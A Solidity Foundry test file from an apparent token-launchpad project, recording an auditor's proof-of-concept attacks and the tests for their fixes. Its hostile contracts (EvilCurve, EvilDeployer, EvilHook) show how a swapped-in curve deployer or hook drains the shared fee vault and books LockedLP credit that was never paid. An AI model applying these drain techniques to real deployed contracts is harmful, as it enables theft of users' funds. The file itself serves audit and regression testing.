// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {Migration} from "../../src/Migration.sol";
import {CreatorFeeHarvest} from "../../src/addons/CreatorFeeHarvest.sol";
import {AnonLauncher} from "../../src/addons/AnonLauncher.sol";
import {Launchpad} from "../../src/Launchpad.sol";
import {DiscipleHook} from "../../src/DiscipleHook.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IntegrationBase} from "../integration/IntegrationBase.sol";
import {Token} from "../../src/Token.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {CurveFeeVault} from "../../src/CurveFeeVault.sol";
import {LockedLP} from "../../src/LockedLP.sol";
import {CurveMath} from "../../src/libraries/CurveMath.sol";
import {ILaunchpad} from "../../src/interfaces/ILaunchpad.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";

/// ───── D2-1a: a swapped-in CurveDeployer (Launchpad.setCurveDeployer, instant until locked) ─────
contract EvilCurve {
    address public immutable quote;

    constructor(address quote_) {
        quote = quote_;
    }

    /// CurveFeeVault books creator credit when msg.sender == Launchpad.curveOf(token). Nothing is transferred.
    function forgeVault(CurveFeeVault v, address token, uint256 amount) external {
        v.settleCurveFee(token, quote, address(0), 0, amount);
    }

    function settleFees() external pure returns (uint256, uint256) {
        return (0, 0);
    }
}

contract EvilDeployer {
    address public immutable q;

    constructor(address q_) {
        q = q_;
    }

    function deploy(
        address,
        address,
        address,
        address,
        address,
        uint256,
        CurveMath.Params calldata,
        uint256,
        uint8,
        address,
        uint256,
        uint256
    ) external returns (address) {
        return address(new EvilCurve(q));
    }
}

/// ───── D2-1b: a swapped-in hook (Migration.setHook, instant until locked) ─────
/// Passes setHook's checks (flag bits, poolManager(), migration()); does nothing else honest.
contract EvilHook {
    IPoolManager public immutable poolManager;
    address public immutable migration;
    LockedLP public immutable llp;

    constructor(IPoolManager pm, address m, LockedLP l) {
        poolManager = pm;
        migration = m;
        llp = l;
    }

    function beforeInitialize(address, PoolKey calldata, uint160) external pure returns (bytes4) {
        return IHooks.beforeInitialize.selector;
    }

    function afterSwap(address, PoolKey calldata, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata)
        external
        pure
        returns (bytes4, int128)
    {
        return (IHooks.afterSwap.selector, 0);
    }

    function registerPool(PoolKey calldata, address, address, address, uint256) external {}

    function claimLockedLiquidityFees(address) external pure returns (uint256, uint256) {
        return (0, 0);
    }

    /// LockedLP.creditLockedLiquidity accepts Migration.hookOf(token) as caller and trusts the amounts.
    function forge(address token, address quote, uint256 tokenAmt, uint256 quoteAmt) external {
        llp.creditLockedLiquidity(token, quote, tokenAmt, quoteAmt);
    }
}

/// @notice Auditor's delta-2 PoCs (part 2/4), kept as-is: they show what an UNLOCKED curve / hook swap can do (owner
///         trust). Fix (maker 2026-11-20): mainnet Deploy locks both swaps in the deploy tx and `_verify` reads the locks
///         back. `test_D2_1_locked_*` show the locked state blocks both attacks at the first step.
contract AuditDelta2 is IntegrationBase {
    address internal mallory = makeAddr("mallory");

    function _params(string memory n) internal view returns (ILaunchpad.LaunchParams memory) {
        return ILaunchpad.LaunchParams({
            name: n, ticker: n, imageURI: "x", description: "", socialsURI: "", quote: address(quote),
            creatorTaxBps: 0, creatorBuyQuoteIn: 0, creatorBuyMinTokensOut: 0, deadline: block.timestamp + 1
        });
    }

    /// The owner swaps the curve code "for new coins only"; the new coin's curve books creator credit on the shared
    /// CurveFeeVault and its creator walks off with every other coin's curve-phase fees.
    function test_D2_1a_curveSwap_drainsVault() public {
        (BondingCurve c, Token tok) = _launch(500, 0); // honest coin, 5% creator tax
        _warpPastSnipe();
        for (uint256 i; i < 5; ++i) {
            address w = makeAddr(string(abi.encodePacked("buyer", vm.toString(i))));
            quote.mint(w, 100 * U);
            _buy(c, w, 100 * U, 0);
        }
        c.settleFees();
        uint256 vBal = quote.balanceOf(address(feeVault));
        uint256 victimOwed = feeVault.creatorAccrued(address(tok), creator);
        assertGt(victimOwed, 0, "honest creator has curve fees in the vault");

        address evil = address(new EvilDeployer(address(quote)));
        vm.prank(owner);
        launchpad.setCurveDeployer(evil);
        vm.prank(mallory);
        ILaunchpad.LaunchResult memory r = launchpad.launchCoin(_params("x"));
        assertTrue(feeRouter.authorizedCallers(r.curve), "fake curve authorized on FeeRouter too");

        EvilCurve(r.curve).forgeVault(feeVault, r.token, vBal);
        feeVault.claimCreatorFees(r.token); // anyone may trigger; pays mallory
        assertEq(quote.balanceOf(mallory), vBal, "every coin's curve-phase fees");
        assertEq(quote.balanceOf(address(feeVault)), 0);

        vm.expectRevert(); // the honest creator's booked fees are no longer backed
        feeVault.claimCreatorFees(address(tok));
        console2.log("vault drained (quote raw)", vBal);
    }

    /// The owner swaps the hook "for new coins only"; a coin graduating on it books LockedLP compound credit that no
    /// one paid, against the quote LockedLP holds for every other coin.
    function test_D2_1b_hookSwap_forgesLockedLPCredit() public {
        // honest coin Y: sniped at launch, so its 99% sniper tax sits in LockedLP's quote bucket after graduation
        (BondingCurve cy, Token y) = _launch(0, 0);
        quote.mint(sniper, 3_000 * U);
        _buy(cy, sniper, 3_000 * U, 0);
        _graduate(cy);
        (, uint256 yq) = lockedLP.compoundBucket(address(y));
        uint256 llpQuote = quote.balanceOf(address(lockedLP));
        assertGt(yq, 0, "honest coin Y has quote in LockedLP");

        // owner installs the evil hook for the next graduation
        address at = address(uint160(0xBEEF00002044)); // BEFORE_INITIALIZE | AFTER_SWAP | AFTER_SWAP_RETURNS_DELTA
        vm.etch(at, address(new EvilHook(manager, address(migration), lockedLP)).code);
        vm.prank(owner);
        migration.setHook(at);

        // coin X graduates on it (ordinary curve, ordinary buyers)
        (BondingCurve cx, Token x) = _launch(0, 0);
        _graduate(cx);
        assertEq(migration.hookOf(address(x)), at);

        llpQuote = quote.balanceOf(address(lockedLP));
        // forged credit: X's bucket now claims all the quote LockedLP holds (Y's included), nothing was sent
        EvilHook(at).forge(address(x), address(quote), 0, llpQuote);
        (, uint256 xq) = lockedLP.compoundBucket(address(x));
        (, uint256 yq2) = lockedLP.compoundBucket(address(y));
        assertEq(quote.balanceOf(address(lockedLP)), llpQuote, "no quote arrived");
        assertGe(xq, llpQuote);
        assertGt(xq + yq2, quote.balanceOf(address(lockedLP)), "LockedLP books exceed its quote: insolvent");
        console2.log("LockedLP quote held / booked to X / booked to Y", llpQuote, xq, yq2);
    }

    // ── fix: locked swaps (what mainnet Deploy does) ──

    function test_D2_1a_locked_curveSwapReverts() public {
        vm.prank(owner);
        launchpad.lockCurveDeployer();
        assertTrue(launchpad.curveDeployerLocked());
        address evil = address(new EvilDeployer(address(quote)));
        address before = address(launchpad.curveDeployer());
        vm.prank(owner);
        vm.expectRevert();
        launchpad.setCurveDeployer(evil);
        assertEq(address(launchpad.curveDeployer()), before);
    }

    function test_D2_1b_locked_hookSwapReverts() public {
        vm.prank(owner);
        migration.lockHook();
        address at = address(uint160(0xBEEF00002044));
        vm.etch(at, address(new EvilHook(manager, address(migration), lockedLP)).code);
        vm.prank(owner);
        vm.expectRevert(Migration.HookLocked.selector);
        migration.setHook(at);
        assertEq(address(migration.hook()), address(hook));
        // and the real hook is still the only one LockedLP accepts credit from for a coin graduated after the lock
        (BondingCurve cx, Token x) = _launch(0, 0);
        _graduate(cx);
        assertEq(migration.hookOf(address(x)), address(hook));
        vm.expectRevert();
        EvilHook(at).forge(address(x), address(quote), 0, 1);
    }
}

/// @notice Auditor delta-2 part 1/4 fixes: M-01 (A → B → A payee revival), L-01 (direct setters void pending sigs),
///         L-02 (claimAll best effort).
contract AuditDelta2Fixes is IntegrationBase {
    AnonLauncher internal anon;
    address internal payee = makeAddr("payee");
    address internal bot = makeAddr("bot");
    address internal stealth;
    uint256 internal sk;

    function setUp() public override {
        super.setUp();
        anon = new AnonLauncher(owner, address(launchpad), address(feeRouter), address(quote), address(0));
        vm.startPrank(owner);
        harvest.wire(address(launchpad), address(feeRouter), address(lockedLP), address(router), address(manager));
        feeRouter.setClaimRouter(address(harvest), true);
        feeRouter.setCreatorFeeHarvest_51(address(harvest));
        harvest.setAnonLauncher(address(anon));
        anon.setCreatorFeeHarvest(address(harvest));
        anon.setHook(address(hook));
        vm.stopPrank();
        (stealth, sk) = makeAddrAndKey("stealth");
    }

    function _sig(uint256 pk, bytes32 domain, bytes32 structHash) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s_) = vm.sign(pk, keccak256(abi.encodePacked("\x19\x01", domain, structHash)));
        return abi.encodePacked(r, s_, v);
    }

    function _domain(string memory name, address c) internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256("1"),
                block.chainid,
                c
            )
        );
    }

    function _orbitAndTrade(BondingCurve c, Token tok) internal {
        _graduate(c);
        _swapExactInQuoteForToken(tok, trader1, 200 * U);
        _swapExactInTokenForQuote(tok, trader1, tok.balanceOf(trader1) / 2);
    }

    // M-01: A sets a pick, hands the coin to B, B hands it back. A's old pick must not come back.
    function test_M01_payeeDoesNotReviveOnTransferBack() public {
        (BondingCurve c, Token tok) = _launch(0, 0);
        vm.prank(creator);
        harvest.setCreatorFeeRecipient(address(tok), payee);
        assertEq(harvest.creatorFeeRecipientOf(address(tok), creator), payee);

        address b = makeAddr("B");
        vm.prank(creator);
        launchpad.transferCreator(address(tok), b);
        vm.prank(b);
        launchpad.transferCreator(address(tok), creator);
        assertEq(launchpad.creatorEpoch(address(tok)), 2);
        assertEq(harvest.creatorFeeRecipientOf(address(tok), creator), creator, "old pick is void");

        _orbitAndTrade(c, tok);
        (uint256 hq,) = hook.claimable(address(tok), 0);
        assertGt(hq, 0);
        uint256 c0 = quote.balanceOf(creator);
        hook.claimCreatorFees(address(tok));
        assertEq(quote.balanceOf(creator) - c0, hq, "paid to A, not A's old payee");
        assertEq(quote.balanceOf(payee), 0);

        // A can pick again in the new epoch
        vm.prank(creator);
        harvest.setCreatorFeeRecipient(address(tok), payee);
        assertEq(harvest.creatorFeeRecipientOf(address(tok), creator), payee);
    }

    // L-01: a direct transferCreator voids a pending signed transfer (same nonce space).
    function test_L01_directTransferVoidsPendingSig() public {
        (address w, uint256 pk) = makeAddrAndKey("gaslessCreator");
        (, Token tok) = _launch(0, 0);
        vm.prank(creator);
        launchpad.transferCreator(address(tok), w);
        uint256 dl = block.timestamp + 1 hours;
        bytes32 ld = _domain("DISCIPLE Launchpad", address(launchpad));
        address evil = makeAddr("evil");
        bytes memory oldSig = _sig(
            pk, ld, keccak256(abi.encode(launchpad.TRANSFER_CREATOR_TYPEHASH(), address(tok), evil, launchpad.sigNonces(w), dl))
        );
        // w changes their mind and edits directly (any direct edit bumps the nonce)
        vm.prank(w);
        launchpad.updateMetadata(address(tok), "ipfs://x", "", "");
        vm.expectRevert(Launchpad.BadSignature.selector);
        launchpad.transferCreatorBySig(address(tok), evil, dl, oldSig);
        assertEq(launchpad.creatorOf(address(tok)), w);
    }

    // L-01: a direct pays-to pick voids a pending signed pick.
    function test_L01_directPickVoidsPendingSig() public {
        (address w, uint256 pk) = makeAddrAndKey("gaslessCreator");
        (, Token tok) = _launch(0, 0);
        vm.prank(creator);
        launchpad.transferCreator(address(tok), w);
        uint256 dl = block.timestamp + 1 hours;
        address old = makeAddr("oldPick");
        bytes memory oldSig = _sig(
            pk,
            _domain("DISCIPLE CreatorFeeHarvest", address(harvest)),
            keccak256(abi.encode(harvest.SET_RECIPIENT_TYPEHASH(), address(tok), old, harvest.sigNonces(w), dl))
        );
        vm.prank(w);
        harvest.setCreatorFeeRecipient(address(tok), payee);
        vm.prank(bot);
        vm.expectRevert(CreatorFeeHarvest.NotCreator.selector);
        harvest.setCreatorFeeRecipientBySig(address(tok), old, dl, oldSig);
        assertEq(harvest.creatorFeeRecipientOf(address(tok), w), payee);
    }

    // L-01: AnonLauncher direct setPayee voids a pending signed SetPayee.
    function test_L01_anonDirectPayeeVoidsPendingSig() public {
        ILaunchpad.LaunchResult memory r = anon.launchAnon(
            ILaunchpad.LaunchParams({
                name: "A", ticker: "A", imageURI: "x", description: "", socialsURI: "", quote: address(quote),
                creatorTaxBps: 0, creatorBuyQuoteIn: 0, creatorBuyMinTokensOut: 0, deadline: block.timestamp + 1
            }),
            stealth,
            stealth,
            "",
            bytes1(0),
            0
        );
        uint256 dl = block.timestamp + 1 hours;
        address old = makeAddr("oldPick");
        bytes32 sh = keccak256(abi.encode(anon.PAYEE_TYPEHASH(), r.token, old, anon.nonces(stealth), dl));
        (uint8 v, bytes32 rr, bytes32 ss) = vm.sign(sk, keccak256(abi.encodePacked("\x19\x01", anon.domainSeparator(), sh)));
        vm.prank(stealth);
        anon.setPayee(r.token, payee);
        vm.expectRevert(AnonLauncher.BadSignature.selector);
        anon.setPayeeBySig(r.token, old, dl, abi.encodePacked(rr, ss, v));
        assertEq(anon.payeeOf(r.token), payee);
    }

    // L-02: a payee that can't receive (e.g. blacklisted on the quote) skips only the creator share in claimAll.
    function test_L02_claimAll_revertingPayeeSkipsOnlyItsShare() public {
        (BondingCurve c, Token tok) = _launch(0, 0);
        vm.prank(creator);
        harvest.setCreatorFeeRecipient(address(tok), payee);
        _orbitAndTrade(c, tok);
        (uint256 cq,) = hook.claimable(address(tok), 0);
        (uint256 tq,) = hook.claimable(address(tok), 2);
        assertGt(cq, 0);
        assertGt(tq, 0);

        vm.mockCallRevert(address(quote), abi.encodeWithSelector(IERC20.transfer.selector, payee), "blacklisted");
        address[] memory ts = new address[](1);
        ts[0] = address(tok);
        uint256 t0 = quote.balanceOf(treasury);
        vm.expectEmit(true, false, false, true, address(hook));
        emit DiscipleHook.ClaimFailed(address(tok), 0);
        vm.prank(bot);
        hook.claimAll(ts);
        assertEq(quote.balanceOf(treasury) - t0, tq, "treasury still paid");
        (uint256 tq2,) = hook.claimable(address(tok), 2);
        assertEq(tq2, 0);
        (uint256 cq2,) = hook.claimable(address(tok), 0);
        assertEq(cq2, cq, "creator share untouched, still claimable");

        vm.clearMockedCalls();
        hook.claimCreatorFees(address(tok));
        assertEq(quote.balanceOf(payee), cq, "paid once the payee can receive");
    }
}
